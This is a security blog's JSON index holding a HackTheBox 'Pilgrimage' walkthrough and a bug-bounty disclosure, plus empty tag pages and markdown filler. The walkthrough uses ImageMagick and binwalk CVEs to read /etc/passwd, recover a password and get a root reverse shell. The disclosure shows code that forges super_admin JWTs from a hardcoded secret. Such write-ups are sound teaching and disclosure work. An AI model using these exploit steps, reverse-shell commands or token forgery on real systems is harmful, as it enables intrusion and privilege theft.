[{"content":"","date":"26 July 2023","permalink":"/ctf/","section":"Ctfs","summary":"","title":"Ctfs"},{"content":"","date":"26 July 2023","permalink":"/tags/cve/","section":"Tags","summary":"","title":"cve"},{"content":" Introduction # Pilgrimage is a machine by HackTheBox created by user coopertim13.\nGetting root in this machine involves exploiting two CVEs1. An ImageMagick CVE-2022-44268 which is used to gain access to user emily and a binwalk CVE-2022-4510 which is used to get access as root.\nInformation Gathering # Like all HTB machines the first step is to run a network scan to find any open ports. For this task I used rustscan.\n.----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan [~] The config file is expected to be at \u0026#34;/Users/raftos/.rustscan.toml\u0026#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan\u0026#39;s speed. Use the Docker image, or up the Ulimit with \u0026#39;--ulimit 5000\u0026#39;. Open 10.10.11.219:22 Open 10.10.11.219:80 The open ports indicate a web server at port 80 and the ssl server running at port 22, pretty typical for a machine like this.\nVisiting port 80 through a web browser we get redirected to pilgrimage.htb so lets add this to our hosts file. This will allow us to visit the website using this url from now on.\necho 10.10.11.219 pilgrimage.htb \u0026gt;\u0026gt; /etc/hosts Website homepage The main attraction of the website is an upload form that takes an image from the user and shrinks it allowing him them to download it from the web server. Using some meta hacking 😎 (experience with CTF) I am pretty sure I am dealing with some kind of file upload attack.\nBut before I continue I set up a file scan on the webserver to see if I can find anything juicy.\ngobuster dir -u http://pilgrimage.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Starting gobuster in directory enumeration mode =============================================================== /register.php (Status: 200) [Size: 6173] /index.php (Status: 200) [Size: 7621] /login.php (Status: 200) [Size: 6166] /logout.php (Status: 302) [Size: 0] [--\u0026gt; /] /.htaccess (Status: 403) [Size: 153] /. (Status: 200) [Size: 7621] /.html (Status: 403) [Size: 153] /dashboard.php (Status: 302) [Size: 0] [--\u0026gt; /login.php] /.htpasswd (Status: 403) [Size: 153] /.htm (Status: 403) [Size: 153] /.git (Status: 301) [Size: 169] [--\u0026gt; http://pilgrimage.htb/.git/] /.htpasswds (Status: 403) [Size: 153] /.htgroup (Status: 403) [Size: 153] As it seems by the output of gobuster I am dealing with a php application, which ties well with file upload vulnerabilites, but there is also a .git repository publicly available from the webserver. This is like finding a tresure chest 💎💎💎\nGetting a Foothold # To get to the tresure I need a shovel. Using GitTools I will dump the .git repository to my attack machine and then exract from it all of its contents for further analysis.\nmkdir ./dump /opt/GitTools/Dumper/gitdumper.sh http://pilgrimage.htb/.git/ ./dump /opt/GitTools/Extractor/extractor.sh ./dump/.git ./dump/website Taking a look inside the extracted documents it is plain to see that this is the code for the web application running on port 80.\ntotal 53912 drwxr-xr-x 11 raftos staff 352 Jul 25 20:41 . drwxr-xr-x 4 raftos staff 128 Jul 23 22:54 .. drwxr-xr-x 7 raftos staff 224 Jul 24 23:34 assets -rw-r--r-- 1 raftos staff 205 Jul 23 22:53 commit-meta.txt -rw-r--r-- 1 raftos staff 5538 Jul 23 22:53 dashboard.php -rw-r--r-- 1 raftos staff 9430 Jul 24 23:26 index.php -rw-r--r-- 1 raftos staff 6822 Jul 23 22:53 login.php -rw-r--r-- 1 raftos staff 98 Jul 23 22:53 logout.php -rw-r--r-- 1 raftos staff 27555008 Jul 23 22:53 magick -rw-r--r-- 1 raftos staff 6836 Jul 23 22:53 register.php drwxr-xr-x 4 raftos staff 128 Jul 23 22:53 vendor After looking around for a bit it is evident that the most interesting file is index.php as it is the file that contains the image shrinking logic.\nif ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { $image = new Bulletproof\\Image($_FILES); if($image[\u0026#34;toConvert\u0026#34;]) { $image-\u0026gt;setLocation(\u0026#34;/var/www/pilgrimage.htb/tmp\u0026#34;); $image-\u0026gt;setSize(100, 4000000); $image-\u0026gt;setMime(array(\u0026#39;png\u0026#39;,\u0026#39;jpeg\u0026#39;)); $upload = $image-\u0026gt;upload(); if($upload) { $mime = \u0026#34;.png\u0026#34;; $imagePath = $upload-\u0026gt;getFullPath(); if(mime_content_type($imagePath) === \u0026#34;image/jpeg\u0026#34;) { $mime = \u0026#34;.jpeg\u0026#34;; } $newname = uniqid(); exec(\u0026#34;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/\u0026#34; . $upload-\u0026gt;getName() . $mime . \u0026#34; -resize 50% /var/www/pilgrimage.htb/shrunk/\u0026#34; . $newname . $mime); unlink($upload-\u0026gt;getFullPath()); $upload_path = \u0026#34;http://pilgrimage.htb/shrunk/\u0026#34; . $newname . $mime; if(isset($_SESSION[\u0026#39;user\u0026#39;])) { $db = new PDO(\u0026#39;sqlite:/var/db/pilgrimage\u0026#39;); $stmt = $db-\u0026gt;prepare(\u0026#34;INSERT INTO `images` (url,original,username) VALUES (?,?,?)\u0026#34;); $stmt-\u0026gt;execute(array($upload_path,$_FILES[\u0026#34;toConvert\u0026#34;][\u0026#34;name\u0026#34;],$_SESSION[\u0026#39;user\u0026#39;])); } header(\u0026#34;Location: /?message=\u0026#34; . $upload_path . \u0026#34;\u0026amp;status=success\u0026#34;); } else { header(\u0026#34;Location: /?message=Image shrink failed\u0026amp;status=fail\u0026#34;); } } else { header(\u0026#34;Location: /?message=Image shrink failed\u0026amp;status=fail\u0026#34;); } } The first thing I noticed is the ever suspicious exec function. My first instict is to try for some command injection but upon closer inspection of the code it is clear that no variable passed as a string in the command to be executed is actually user controled, so an injection type attack is ruled out.\nThe next thing I notice is that the application uses the magick (ImageMagick) binary for doing the actual shriking of the image. ImageMagick is a very popular software for doing image maniputation tasks but is also a very common attack vector with hundreds of CVEs tied to it. After finding out the version and the way it is used by the index.php document it seems like I can use this POC for CVE-2022-44268 to create a malicious image. That when uploaded to the server can read the contents of arbitary files and store it as metadata inside the image.\nThe software of the POC uses rust to construct the malicious image. After the image is created all I need to do is upload it to the web application, let the server\u0026rsquo;s magick binary process it and when ready download it through the web application but now shrinked AND with my request data inside.\ngenerate-payload \u0026#34;/etc/passwd\u0026#34; After the site has proccesed the malicious image I can download it using the link provided. Using my local version of magick to inspect the metadata of the image that I downloaded from the server. I can see the contents of the /etc/passwd file included in the Raw profile type section as hex.\nmagick identify -verbose images/passwd.png Image: Filename: images/passwd.png Permissions: rw-r--r-- Format: PNG (Portable Network Graphics) Mime type: image/png Class: PseudoClass ... Raw profile type: 1437 726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d 6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f 6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e 2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269 6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f 62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d 65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a 2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a 783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f 6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372 2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73 706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31 303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f 6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573 722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d 646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b 75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f 7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69 7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67 696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73 62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d 5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e 6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334 3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e 2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374 656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72 6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65 6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e 0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052 65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f 6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973 74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573 796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69 7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c 6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d 652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78 3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f 7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f 737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938 3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a ... With the help of a small script I can decode and read the content. We can see the root user, the www-data user which is probably the one running the web appliaction and also the user emily.\nimport sys import subprocess if len(sys.argv) \u0026lt; 2: print(\u0026#34;Leaked image path\u0026#34;) exit() filepath = sys.argv[1] p = subprocess.run(f\u0026#34;magick identify -verbose {filepath}\u0026#34;, shell=True, check=True, capture_output=True) out = p.stdout.decode() err = p.stderr.decode() start = out.index(\u0026#34;Raw profile type:\u0026#34;) end = out.index(\u0026#34;signature\u0026#34;) profile_substring = out[start+17:end] for i in range(1000): try: print(bytes.fromhex(profile_substring[i:])) break except Exception as e: pass root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin ... www-data❌33:33:www-data:/var/www:/usr/sbin/nologin ... emily❌1000:1000:emily,,,:/home/emily:/bin/bash ... Using the arbitary read exploit I try for some time to get anything useful out of the server in order to gain entry but with no luck. Finaly I remembered the sqlite file which can be seen in index.php, maybe it contains something that I can use.\nIndeed using the exploit to read the /var/db/pilgrimage and inspecting its contents there is something interesting. Something that appears like a password.\n# snippet from the output \\x18\\x01\\x03\\x17-emilyabigchonkyboi123 Using abigchonkyboi123 as emily\u0026rsquo;s password with ssh logs me in and I can also get the user flag.\nPrivilege Escalation # As the user emily I can take a look around the server from the inside. A tool I use for almost all privilege escalation senarios in CTFs is pspy. It allows for snooping running processes in a linux server without need for root permissions. I use scp to upload it to the target machine.\nscp /opt/pspy64 emily@10.10.11.219:/tmp/pspy64 Letting the tool run a few minutes and messing around with the application I notice that when uploading an image through the web application the script /usr/sbin/malwarescan.sh runs.\nLogs from pspy during an image upload #!/bin/bash blacklist=(\u0026#34;Executable script\u0026#34; \u0026#34;Microsoft executable\u0026#34;) /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do filename=\u0026#34;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo \u0026#34;$FILE\u0026#34; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e \u0026#39;s/^.*CREATE //p\u0026#39;)\u0026#34; binout=\u0026#34;$(/usr/local/bin/binwalk -e \u0026#34;$filename\u0026#34;)\u0026#34; for banned in \u0026#34;${blacklist[@]}\u0026#34;; do if [[ \u0026#34;$binout\u0026#34; == *\u0026#34;$banned\u0026#34;* ]]; then /usr/bin/rm \u0026#34;$filename\u0026#34; break fi done done Essentially this script uses inotifywait to listen for CREATE events happening in the /var/www/pilgrimage.htb/shrunk/ directory, which is the directory the uploaded images from the web application sit, and uses binwalk to search for malicious content inside them.\nThe version of binwalk used by the server is v2.3.2 which is vulnerable and has CVE-2022-4510. Using this poc from exploit db. I can create a malicious image, upload it to the server and wait for the scipt /usr/sbin/malwarescan.sh to run. Binwalk will proc the exploit to fire and me having setup a listening reverse shell will login as root.\npython3 scripts/exploit.py image.png 10.10.14.139 4001 scp binwalk_exploit.png emily@10.10.11.219:/var/www/pilgrimage.htb/shrunk/binwalk_exploit.png nc -lv 4001 And thus the pilgrimage ends!\nCVE stands for Common Vulnerabilities and Exposures which are publicly disclosed vulnerabities in software reported by security researchers and ethical hacker, just like this.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"26 July 2023","permalink":"/ctf/htb-pilgrimage/","section":"Ctfs","summary":"Introduction # Pilgrimage is a machine by HackTheBox created by user coopertim13.","title":"HTB Pilgrimage"},{"content":"","date":"26 July 2023","permalink":"/tags/image-poisoning/","section":"Tags","summary":"","title":"image poisoning"},{"content":"","date":"26 July 2023","permalink":"/tags/linux/","section":"Tags","summary":"","title":"linux"},{"content":"","date":"26 July 2023","permalink":"/","section":"r4f705's blog","summary":"","title":"r4f705's blog"},{"content":"","date":"26 July 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"26 July 2023","permalink":"/tags/web/","section":"Tags","summary":"","title":"web"},{"content":"","date":"21 July 2023","permalink":"/bug-bounty/","section":"Bug-bounties","summary":"","title":"Bug-bounties"},{"content":"","date":"21 July 2023","permalink":"/tags/docker/","section":"Tags","summary":"","title":"docker"},{"content":" JWT Token Forgery for Haystack\u0026rsquo;s Annotator Tool (CVE-2023-1712) # Introduction # The purpose of this disclosure is to ethically report a web vulnerability found in the Annotator Tool. By analyzing the provided docker image, it was possible to gain access to the source code and identify a critical security flaw related to the generation of JSON Web Tokens (JWTs). This vulnerability allows low-level users to escalate their privileges and perform actions that were previously restricted.\nVulnerability Details # The vulnerability stems from a hardcoded value found in the configuration file config/config.production.js. Specifically, the value of config.jwt.secret = Hm************tA is used to sign JWT tokens. Exploiting this weakness enables an attacker to create new JWT tokens with the \u0026ldquo;super_admin\u0026rdquo; role, granting unauthorized access and privileges.\nExploitation Method # To exploit this vulnerability, the attacker needs to replicate the token generation process used by the application. This can be achieved by modifying the existing back-end code of the annotation tool. The following lines can be added to the getSignedJWT function in app/service/userService.js:\nconst fs = require(\u0026#34;fs\u0026#34;); let x = this.app.jwt.sign( { id: 2, email: \u0026#34;r4F705@proxy.com\u0026#34;, role: \u0026#34;super_admin\u0026#34;, }, \u0026#34;Hm************tA\u0026#34; ); fs.writeFile(\u0026#34;/tmp/test.txt\u0026#34;, x, (err) =\u0026gt; { if (err) { console.error(err); } }); By incorporating this code snippet into a modified version of the back-end, the attacker can host a local instance of the application. Logging in with a regular user account on the modified instance will generate a new JWT token with the \u0026ldquo;super_admin\u0026rdquo; role. To utilize this forged token, the attacker can retrieve it from /tmp/test.txt within the running container or the host system. Then, by updating the value of the \u0026ldquo;dpst-token\u0026rdquo; found in the browser\u0026rsquo;s local storage for the original login domain, the attacker can assume the elevated privileges associated with the \u0026ldquo;super_admin\u0026rdquo; role.\nlogged in as admin at deepset.ai Impact # This vulnerability has significant implications for all current versions of the annotation tool, regardless of whether they are hosted online or within a company\u0026rsquo;s internal network. Since the containers utilized by the tool share the same secret key, any forged tokens created using the vulnerability will be effective across all instances of the tool.\nThe impact of this vulnerability is twofold, affecting both the integrity and availability of the tool and its associated data. Exploiting the vulnerability allows an attacker to gain super admin access without the need for a valid account, posing a severe security risk. With super admin privileges, an attacker can masquerade as any other user, leading to unauthorized modifications to the annotation process and the potential corruption of valuable training data for QA models. As a result, the reliability and trustworthiness of the annotation tool\u0026rsquo;s outputs are compromised.\nFurthermore, an attacker can leverage scripted attacks to remove created users, significantly impeding the functionality and usability of the tool. The removal of user accounts can disrupt workflows and impede collaboration, rendering the tool\u0026rsquo;s usage challenging and hindering productivity.\nOriginally reported on huntr\n","date":"21 July 2023","permalink":"/bug-bounty/haystack/","section":"Bug-bounties","summary":"JWT Token Forgery for Haystack\u0026rsquo;s Annotator Tool (CVE-2023-1712) # Introduction # The purpose of this disclosure is to ethically report a web vulnerability found in the Annotator Tool.","title":"Haystack"},{"content":"","date":"21 July 2023","permalink":"/tags/jwt/","section":"Tags","summary":"","title":"jwt"},{"content":"","date":"21 July 2023","permalink":"/tags/reversing/","section":"Tags","summary":"","title":"reversing"},{"content":"","date":"21 July 2023","permalink":"/tags/arm/","section":"Tags","summary":"","title":"arm"},{"content":" Lists # To define a list of items, just put a *, a -, or a + at the start of the line of each item of the list followed by at least a space, to end the list, leave a blank line\nred green blue white grey black yellow pink orange You can also define numbered list, putting a number followed by a . or a ) and a space at the start of the line (you may use any number, the first one is taken to start counting, then it will increment by one):\nyou may leave blank items or start again You can insert any block inside a list, you have to respect the indentation of the text of the list item\nA paragraph of text (spanning multiple lines),\nfenced code, indented code (4 spaces + 2 spaces for the list indentation, one blank line above, one below), quotes,\nanother list (and so on\u0026hellip;), or headers # ","date":"21 July 2023","permalink":"/binary/arm-antidote/","section":"Binaries","summary":"Lists # To define a list of items, just put a *, a -, or a + at the start of the line of each item of the list followed by at least a space, to end the list, leave a blank line","title":"ARM Antidote"},{"content":"","date":"21 July 2023","permalink":"/binary/","section":"Binaries","summary":"","title":"Binaries"},{"content":" Headers # There are two ways to define headers:\nThe biggest possible header # You can also use this markup # (I prefer the first one as it\u0026rsquo;s more readable when looking directly at the source code)\nA sub heading # This is the alternative format # Then you can go smaller # And smaller # And even smaller # No, you can\u0026rsquo;t go smaller than this # The good thing is that many tools that convert Markdown in HTML or PDF are able to generate the index of your document, or links to the headers automatically (like Github does on the source of Markdown files)\n","date":"21 July 2023","permalink":"/web/easter-bunny/","section":"Webs","summary":"Headers # There are two ways to define headers:","title":"Easter Bunny"},{"content":"","date":"21 July 2023","permalink":"/tags/poisoning/","section":"Tags","summary":"","title":"poisoning"},{"content":"","date":"21 July 2023","permalink":"/tags/pwn/","section":"Tags","summary":"","title":"pwn"},{"content":"","date":"21 July 2023","permalink":"/tags/varnish/","section":"Tags","summary":"","title":"varnish"},{"content":"","date":"21 July 2023","permalink":"/web/","section":"Webs","summary":"","title":"Webs"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"}]